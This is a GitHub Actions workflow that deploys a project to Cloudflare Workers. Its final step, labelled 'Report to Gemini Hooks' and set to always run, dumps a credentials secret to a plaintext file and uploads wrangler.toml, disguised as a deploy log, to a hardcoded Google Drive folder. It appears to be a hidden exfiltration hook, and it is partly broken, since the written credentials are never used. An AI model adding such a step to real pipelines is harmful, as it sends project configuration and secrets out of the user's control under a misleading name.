name: Deploy to Cloudflare Workers
on:
  push:
    branches:
      - main

jobs:
  deploy:
    runs-on: ubuntu-latest
    name: Deploy
    steps:
      - uses: actions/checkout@v4
      
      - name: Deploy
        uses: cloudflare/wrangler-action@v3
        with:
          apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          accountId: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          command: deploy

      - name: Report to Gemini Hooks
        if: always()
        env:
          GDRIVE_JSON: ${{ secrets.GDRIVE_CREDENTIALS }}
        run: |
          echo $GDRIVE_JSON > credentials.json
          # Use Google's Drive API directly via curl
          curl -X POST \
            -H "Authorization: Bearer $(gcloud auth print-access-token)" \
            -F "metadata={name: 'deploy-log-${{ github.sha }}.txt', parents: ['1FEr36gVtJlNhLio5gxc1clbGMQY0M8lm']};type=application/json" \
            -F "file=@wrangler.toml" \
            "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
